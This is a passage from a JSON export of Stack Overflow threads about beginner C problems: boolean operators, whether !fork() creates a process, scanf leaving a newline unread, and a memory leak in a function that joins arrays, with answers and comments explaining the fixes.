}</code> Not sure why you&#39;re doing 100 == 100 though."}, {"owner": {"reputation": 5498, "user_id": 1228887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8dbfa9c3ff51140d2e1a5ff553725a07?s=128&d=identicon&r=PG", "display_name": "twain249", "link": "https://stackoverflow.com/users/1228887/twain249"}, "edited": false, "score": 0, "creation_date": 1499295459, "post_id": 44937243, "comment_id": 76850887, "body": "What&#39;s the point of the <code>100 == 100</code> part of the value?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499295511, "post_id": 44937243, "comment_id": 76850901, "body": "What did a simple search for these operators show? What does you C book say? Any other book about programming? This is basic programming, not even C. We are not a tutoring site."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 5498, "user_id": 1228887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8dbfa9c3ff51140d2e1a5ff553725a07?s=128&d=identicon&r=PG", "display_name": "twain249", "link": "https://stackoverflow.com/users/1228887/twain249"}, "edited": false, "score": 0, "creation_date": 1499295640, "post_id": 44937243, "comment_id": 76850934, "body": "@twain249 To be sure that you can count up till 100.:)"}, {"owner": {"reputation": 13, "user_id": 8261767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/594eb406c5cfa6157f0574be3ead9b15?s=128&d=identicon&r=PG&f=1", "display_name": "JanKos", "link": "https://stackoverflow.com/users/8261767/jankos"}, "edited": false, "score": 0, "creation_date": 1499295647, "post_id": 44937243, "comment_id": 76850937, "body": "The numbers don&#39;t matter at this point. I&#39;m interested in the syntax of a single expression (a = b) and (c = (d or f)"}, {"owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1499295715, "post_id": 44937243, "comment_id": 76850963, "body": "I&#39;m sure there&#39;s a good duplicate for this somewhere, but I couldn&#39;t find it. Here&#39;s one alternative: <a href=\"https://stackoverflow.com/questions/5320657/how-to-write-if-x-equals-5-or-4-or-78-or-in-c\" title=\"how to write if x equals 5 or 4 or 78 or in c\">stackoverflow.com/questions/5320657/&hellip;</a>"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1499295983, "post_id": 44937243, "comment_id": 76851040, "body": "There is nothing called &quot;10 or 100&quot; that you want to compare <code>num</code> to. You want to compare <code>num</code> to 10 and you want to compare <code>num</code> to 100, and you want to combine those two results."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499296113, "post_id": 44937243, "comment_id": 76851083, "body": "You have to use the &quot;either&quot; operator! You will not find it in any C book, not even the standard. <b>Think about it!</b>"}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499303952, "post_id": 44937243, "comment_id": 76852931, "body": "n = ((100==100) &amp;&amp; (num == 10 || num == 100) );  \tprintf(&quot;%i&quot;, n);"}], "answers": [{"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 0, "last_activity_date": 1499295816, "creation_date": 1499295816, "answer_id": 44937317, "question_id": 44937243, "link": "https://stackoverflow.com/questions/44937243/c-beginners-problems-with-multiple-boolean-operators/44937317#44937317", "title": "C beginner&#39;s problems with multiple boolean operators", "body": "<p>This expression</p>\n\n<pre><code>(a = b) and (c = (d or f) \n</code></pre>\n\n<p>can be represented in C in an if statement like</p>\n\n<pre><code>#include &lt;iso646.h&gt;\n\n//...\n\nif ( ( a == b ) and ( c == d or c == f ) ) \n</code></pre>\n\n<p>or just like</p>\n\n<pre><code>if ( ( a == b ) &amp;&amp; ( c == d || c == f ) ) \n</code></pre>\n\n<p>Or in an expression statement like</p>\n\n<pre><code>#include &lt;iso646.h&gt;\n#include &lt;stdbool.h&gt;\n\n//...\n\nbool n = ( a == b ) and ( c == d or c == f );\n</code></pre>\n\n<p>or</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n\n//...\n\nbool n = ( a == b ) &amp;&amp; ( c == d || c == f );\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 80, "user_id": 7658771, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/c38up.png?s=128&g=1", "display_name": "Bicolano", "link": "https://stackoverflow.com/users/7658771/bicolano"}, "is_accepted": false, "score": 0, "last_activity_date": 1499296283, "creation_date": 1499296283, "answer_id": 44937374, "question_id": 44937243, "link": "https://stackoverflow.com/questions/44937243/c-beginners-problems-with-multiple-boolean-operators/44937374#44937374", "title": "C beginner&#39;s problems with multiple boolean operators", "body": "<p>I think I know what you want to do, if you're just interested in the expression, here's what should the if statement would be.</p>\n\n<pre><code>if(a == b &amp;&amp; (c == d || c == f))//It says here, IF A IS EQUAL TO B and C IS EQUAL TO D or F\n{\n    printf(\"1\");\n}\nelse\n{\n    printf(\"0\");\n}\n</code></pre>\n\n<p>don't worry about the curly braces '{}', you can remove that. It just became my hobby.</p>\n"}], "owner": {"reputation": 13, "user_id": 8261767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/594eb406c5cfa6157f0574be3ead9b15?s=128&d=identicon&r=PG&f=1", "display_name": "JanKos", "link": "https://stackoverflow.com/users/8261767/jankos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 334, "favorite_count": 0, "accepted_answer_id": 44937317, "answer_count": 2, "score": 0, "last_activity_date": 1499342682, "creation_date": 1499295299, "last_edit_date": 1499342682, "question_id": 44937243, "link": "https://stackoverflow.com/questions/44937243/c-beginners-problems-with-multiple-boolean-operators", "title": "C beginner&#39;s problems with multiple boolean operators", "body": "<p>I'm looking for a way to use multiple boolean operators in a single expression, but can't figure it out. \nThe code below is an attempt to translate the following into C:</p>\n\n<h3>pseudocode:</h3>\n\n<pre><code>if \n(100 = 100) AND (10 is either 10 or 100) \nprint \"1\"\nelse \nprint \"0\"\n</code></pre>\n\n<h3>C:</h3>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\nint main(void)\n{\n    int num;\n    num= 10;\n    bool n;\n    n = ((100==100) &amp;&amp; (num == (10 || 100)));\n    printf(\"%i\", n);\n}\n</code></pre>\n\n<p>Obviously I'm doing something wrong. </p>\n"}, {"tags": ["c", "process", "fork"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1499293680, "post_id": 44936944, "comment_id": 76850259, "body": "[in both cases] The condition can only be evaluated if fork() is actually called."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 4, "creation_date": 1499293837, "post_id": 44936944, "comment_id": 76850336, "body": "How is this <i>not</i> something you could test yourself?"}], "answers": [{"comments": [{"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499728933, "post_id": 44936979, "comment_id": 77020467, "body": "if (fork()){//father process }         else //child process"}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499728962, "post_id": 44936979, "comment_id": 77020475, "body": "if (!fork())  {  //child process}       else //father process"}], "tags": [], "owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "is_accepted": true, "score": 3, "last_activity_date": 1499293736, "creation_date": 1499293736, "answer_id": 44936979, "question_id": 44936944, "link": "https://stackoverflow.com/questions/44936944/does-fork-create-a-process/44936979#44936979", "title": "Does !fork() create a process?", "body": "<p>It is the same, <code>fork</code> is evaluated before check is made.</p>\n\n<p><code>if (!fork())</code> is the same as <code>if (fork())</code> for function itself but not the same for <code>if</code> statement check.</p>\n"}, {"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 2, "last_activity_date": 1499297283, "creation_date": 1499297283, "answer_id": 44937509, "question_id": 44936944, "link": "https://stackoverflow.com/questions/44936944/does-fork-create-a-process/44937509#44937509", "title": "Does !fork() create a process?", "body": "<p>Of course it does. In order to execute</p>\n\n<pre><code>if (! &lt;expression&gt;)\n</code></pre>\n\n<p>it first has to evaluate <code>&lt;expression&gt;</code>, so that it can then invert the boolean value of the expression and test it with <code>if</code>. When the expression is <code>fork()</code>, it calls the <code>fork</code> function, which creates a new process, and then returns a value in both the child and parent processes.</p>\n\n<p>It's essentially just short for:</p>\n\n<pre><code>pid_t pid = fork();\nif (!pid)\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 8261746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d09079e315089663f2fa03be5674153?s=128&d=identicon&r=PG&f=1", "display_name": "Denver Johnson", "link": "https://stackoverflow.com/users/8261746/denver-johnson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 1, "closed_date": 1499317796, "accepted_answer_id": 44936979, "answer_count": 2, "score": -6, "last_activity_date": 1499297283, "creation_date": 1499293503, "question_id": 44936944, "link": "https://stackoverflow.com/questions/44936944/does-fork-create-a-process", "closed_reason": "Needs more focus", "title": "Does !fork() create a process?", "body": "<p>For instance if I call</p>\n\n<pre><code>if (!fork())\n</code></pre>\n\n<p>does this create a new process like calling</p>\n\n<pre><code>if (fork())\n</code></pre>\n\n<p>or does it not?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1499292864, "post_id": 44936822, "comment_id": 76849947, "body": "Post your code, input, output and expected output here.  Without that, your post is unclear."}, {"owner": {"reputation": 524, "user_id": 2123477, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/M59hC.jpg?s=128&g=1", "display_name": "woz", "link": "https://stackoverflow.com/users/2123477/woz"}, "edited": false, "score": 0, "creation_date": 1499292895, "post_id": 44936822, "comment_id": 76849962, "body": "Add the code to your question. There&#39;s no need to upload an image for that since SO supports code posting and formatting as part of your question."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1499292910, "post_id": 44936822, "comment_id": 76849968, "body": "<code>&quot;%c&quot;</code> --&gt; <code>&quot; %c&quot;</code>"}, {"owner": {"reputation": 13, "user_id": 8007039, "user_type": "registered", "profile_image": "https://graph.facebook.com/579374895593528/picture?type=large", "display_name": "Glenn Tinoco", "link": "https://stackoverflow.com/users/8007039/glenn-tinoco"}, "edited": false, "score": 0, "creation_date": 1499292924, "post_id": 44936822, "comment_id": 76849974, "body": "It&#39;s jut that the second scanf doesnt execute and just printf() and close the program"}, {"owner": {"reputation": 367, "user_id": 8245355, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SH00n.jpg?s=128&g=1", "display_name": "SaxyPandaBear", "link": "https://stackoverflow.com/users/8245355/saxypandabear"}, "edited": false, "score": 0, "creation_date": 1499292954, "post_id": 44936822, "comment_id": 76849980, "body": "How do you know that the first scanf() call &quot;executes well&quot; if you don&#39;t print anything out afterwards? edit: didn&#39;t see that execution screenshot. Whoops"}, {"owner": {"reputation": 13, "user_id": 8007039, "user_type": "registered", "profile_image": "https://graph.facebook.com/579374895593528/picture?type=large", "display_name": "Glenn Tinoco", "link": "https://stackoverflow.com/users/8007039/glenn-tinoco"}, "edited": false, "score": 0, "creation_date": 1499293025, "post_id": 44936822, "comment_id": 76850012, "body": "The problem is solved with the &quot; %c&quot;."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499293110, "post_id": 44936822, "comment_id": 76850043, "body": "You can accept the answer by clicking on the grey checkmark below its score. But please do post the actual code for your program: cut from your editor, paste into the question body, select the code and type Alt-K to indent it."}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499293865, "post_id": 44936822, "comment_id": 76850351, "body": "Don&#39;t post your code as an image."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499294401, "post_id": 44936822, "comment_id": 76850550, "body": "The <code>scanf()</code> function is a brute to foist on novice programmers.  See <a href=\"http://sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html\" rel=\"nofollow noreferrer\">Beginners Guide Aware from <code>scanf()</code></a> for some discussion.  Don&#39;t be upset that you find it hard to use \u2014 it is hard to use."}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1499292944, "creation_date": 1499292944, "answer_id": 44936853, "question_id": 44936822, "link": "https://stackoverflow.com/questions/44936822/scanf-function-doesnt-work-program-in-c-gnu-linux/44936853#44936853", "title": "scanf() function doesnt work program in c [GNU/LINUX]", "body": "<p>You should use a <code>scanf</code> format string <code>\" %c\"</code> to skip any pending whitespace characters, including the newline the user typed after the first letter. As posted, the second <code>scanf()</code> reads the <code>\\n</code> that is pending in the input stream, so it does not wait for user input.</p>\n"}], "owner": {"reputation": 13, "user_id": 8007039, "user_type": "registered", "profile_image": "https://graph.facebook.com/579374895593528/picture?type=large", "display_name": "Glenn Tinoco", "link": "https://stackoverflow.com/users/8007039/glenn-tinoco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "closed_date": 1499293934, "answer_count": 1, "score": -6, "last_activity_date": 1500129585, "creation_date": 1499292782, "last_edit_date": 1500129585, "question_id": 44936822, "link": "https://stackoverflow.com/questions/44936822/scanf-function-doesnt-work-program-in-c-gnu-linux", "closed_reason": "Duplicate", "title": "scanf() function doesnt work program in c [GNU/LINUX]", "body": "<p>Today i have been coding a came across with this code:</p>\n\n<p><a href=\"https://i.stack.imgur.com/HPj1a.png\" rel=\"nofollow noreferrer\">Code</a></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nmain() {\n\n    char letra1;\n    char letra2;\n\n    printf(\"Primera letra: \");\n    scanf(\"%c\", &amp;letra1);\n    printf(\"Segunda letra: \");\n    scanf(\"%c\", &amp;letra2);\n\n}\n</code></pre>\n\n<p>When I execute the code the first <code>scanf()</code> executes well but the second even didn't execute and close the program and I don't know why.</p>\n\n<p><a href=\"https://i.stack.imgur.com/jm4CN.png\" rel=\"nofollow noreferrer\">Execution</a></p>\n\n<pre><code>&gt; ej3\nPrimera letra: A\nSegunda letra: \n</code></pre>\n\n<p>Thanks for your time guys.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 5, "creation_date": 1499291917, "post_id": 44936627, "comment_id": 76849574, "body": "<code>table = arr1;</code> is effectively making your program to forget the brand new allocated memory location in the previous line..."}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1499292025, "post_id": 44936627, "comment_id": 76849615, "body": "Just beat me to it - you need to copy all 3 of the array&#39;s values into <code>table</code>.  The assignment does not do a table copy."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1499292189, "post_id": 44936627, "comment_id": 76849686, "body": "just fyi, you can get the number of elements in your arrays and replace the magic numbers with (for example) <code>sizeof(a1)&#47;sizeof(a1[0])</code>"}, {"owner": {"reputation": 29, "user_id": 7370183, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/bef662264132b866f0c7d034a6d248cf?s=128&d=identicon&r=PG&f=1", "display_name": "Coldcode", "link": "https://stackoverflow.com/users/7370183/coldcode"}, "edited": false, "score": 0, "creation_date": 1499292754, "post_id": 44936627, "comment_id": 76849909, "body": "Thanks for your advice! Problem solved. :)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499293540, "post_id": 44936627, "comment_id": 76850195, "body": "It&#39;s a tad inconsistent to pass the 3 arrays sizes as <code>unsigned int</code> and then sum the sizes into a plain <code>int</code>.  Be consistent.  Consider using <code>size_t</code> for all of them."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499292787, "post_id": 44936745, "comment_id": 76849919, "body": "<code>i</code>, <code>tableLen</code> and <code>tableOffset</code> should have type <code>unsigned int</code>. A even better choice would be to make all these sizes and index values <code>size_t</code>."}], "tags": [], "owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "is_accepted": true, "score": 1, "last_activity_date": 1499292369, "creation_date": 1499292369, "answer_id": 44936745, "question_id": 44936627, "link": "https://stackoverflow.com/questions/44936627/abort-trap-6-in-array-joining-function/44936745#44936745", "title": "Abort trap 6 in array joining function", "body": "<p>Note that you need to copy all 3 tables, not just the second and third.  The assignment of table is effectively throwing away your dynamic memory pointer:</p>\n\n<pre><code>int *join_arrays(unsigned int arr1N, int arr1[], unsigned int arr2N, int arr2[], unsigned int arr3N, int arr3[]) {\n  int tableLen = arr1N + arr2N + arr3N;\n  printf(\"%d\\n\", tableLen);\n  int *table = malloc(tableLen * sizeof(int));\n  int tableOffset = 0;\n\n  for (int i = 0; i &lt; arr1N; i++) {\n   table[tableOffset++] = arr1[i];\n  }\n\n  for (int i = 0; i &lt; arr2N; i++) {\n   table[tableOffset++] = arr2[i];\n  }\n\n  for (int i = 0; i &lt; arr3N; i++) {\n   table[tableOffset++] = arr3[i];\n  }\n\n  return table;\n}\n</code></pre>\n\n<p>I'd also consider returning as a parameter so that the array length could be returned as well.  For higher performance, using <code>memcpy()</code> may also help on certain systems, though for such a simple example, the for loops are easier to understand.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 1, "last_activity_date": 1499294257, "creation_date": 1499294257, "answer_id": 44937084, "question_id": 44936627, "link": "https://stackoverflow.com/questions/44936627/abort-trap-6-in-array-joining-function/44937084#44937084", "title": "Abort trap 6 in array joining function", "body": "<p>The function is wrong. At least there is a memory leak. At first the pointer <code>table</code> points to the allocated memory but then it is reassigned and points to the first character of the first array passed to the function as argument.</p>\n\n<pre><code>int *table = malloc(tableLen * sizeof(int));\ntable = arr1;\n</code></pre>\n\n<p>So the two loops used in the function try to copy to the first array and as result they access memory beyond the array.</p>\n\n<p>Take into account that it is much better to change the order of the function parameters. At first there should be specified an array and only then its size. Also the arrays should be declared with qualifier <code>const</code> and their sizes as having type <code>size_t</code>.</p>\n\n<p>Also it is a bad idea to use magic numbers like 11, 17, and 3. Usually such a usage is a reason for program bugs.</p>\n\n<p>You could use standard C function <code>memcpy</code> instead of the loops.</p>\n\n<p>The program can look the following way</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint * join_arrays( const int a1[], size_t n1, \n                   const int a2[], size_t n2, \n                   const int a3[], size_t n3 ) \n{\n    int *joined = malloc( ( n1 + n2 + n3 ) * sizeof( int ) );\n\n    if ( joined != NULL )\n    {\n        memcpy( joined, a1, n1 * sizeof( int ) );       \n        memcpy( joined + n1, a2, n2 * sizeof( int ) );      \n        memcpy( joined + n1 + n2, a3, n3 * sizeof( int ) );     \n    }\n\n    return joined;\n}\n\nint main( void ) \n{\n    int a1[] = { 89, 53, 98, 5, 5, 49, 95, 9, 54, 59, 59 };\n    int a2[] = { 44, 25, 0, 0, 0, 0, 0, 0, 0, 0, 80, 0, 144, 0, 0, 0, 0};\n    int a3[] = { 20, 21, 22 };\n\n    size_t n1 = sizeof( a1 ) / sizeof( *a1 );\n    size_t n2 = sizeof( a2 ) / sizeof( *a2 );\n    size_t n3 = sizeof( a3 ) / sizeof( *a3 );\n\n    int *joined = join_arrays( a1, n1, a2, n2, a3, n3 );\n\n    if ( joined != NULL )\n    {\n        for ( size_t i = 0, n = n1 + n2 + n3; i &lt; n; i++ ) \n        {\n            printf( \"%d  \", joined[i] );\n        }\n        printf( \"\\n\" );\n    }\n\n\n    free( joined );\n\n    return 0;\n}\n</code></pre>\n\n<p>Its output is</p>\n\n<pre><code>89  53  98  5  5  49  95  9  54  59  59  44  25  0  0  0  0  0  0  0  0  80  0  144  0  0  0  0  20  21  22  \n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 7370183, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/bef662264132b866f0c7d034a6d248cf?s=128&d=identicon&r=PG&f=1", "display_name": "Coldcode", "link": "https://stackoverflow.com/users/7370183/coldcode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 44936745, "answer_count": 2, "score": 1, "last_activity_date": 1499294257, "creation_date": 1499291771, "question_id": 44936627, "link": "https://stackoverflow.com/questions/44936627/abort-trap-6-in-array-joining-function", "title": "Abort trap 6 in array joining function", "body": "<p>I'm trying to join the arrays together using a function. It works somehow but prompts an error abort trap 6. In addition, it also says that I cannot free the allocated memory.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint *join_arrays(unsigned int arr1N, int arr1[], unsigned int arr2N, int arr2[], unsigned int arr3N, int arr3[]) {\n  int tableLen = arr1N + arr2N + arr3N;\n  printf(\"%d\\n\", tableLen);\n  int *table = malloc(tableLen * sizeof(int));\n  table = arr1;\n  printf(\"%d\\n\", table[arr1N - 1]);\n  for (int i = 0; i &lt; arr2N; i++) {\n   table[i + arr1N] = arr2[i];\n  }\n  printf(\"%d\\n\", table[arr1N + arr2N - 1]);\n  for (int j = 0; j &lt; arr3N; j++) {\n   table[j + arr1N + arr2N] = arr3[j];\n  }\n\n  return table;\n}\n\nint main(void)\n{\n    int a1[] = { 89, 53, 98, 5, 5, 49, 95, 9, 54, 59, 59 };\n    int a2[] = { 44, 25, 0, 0, 0, 0, 0, 0, 0, 0, 80, 0, 144, 0, 0, 0, 0};\n    int a3[] = { 20, 21, 22 };\n\n    int *joined = join_arrays(11, a1, 17, a2, 3, a3);\n\n    for (int i = 0; i &lt; 11 + 17 + 3; i++) {\n        printf(\"%d  \", joined[i]);\n    }\n    printf(\"\\n\");\n\n    free(joined);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "endianness"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499291304, "post_id": 44936498, "comment_id": 76849331, "body": "Why not try it?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1499291335, "post_id": 44936498, "comment_id": 76849339, "body": "How do you know it allocates 32-bits? That looks like an 8-bit bool followed by three other things that are zero, like <code>B</code> being false."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1499291893, "post_id": 44936498, "comment_id": 76849560, "body": "Is is C standard and implementation dependant"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1499292036, "post_id": 44936498, "comment_id": 76849618, "body": "C doesn&#39;t define a type <code>BOOL</code>. It defines <code>_Bool</code>, and <code>stdbool.h</code> defines <code>bool</code>. What does your <code>BOOL</code> typedef look like?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499293262, "post_id": 44936498, "comment_id": 76850090, "body": "Although you are allowed (at the moment) to 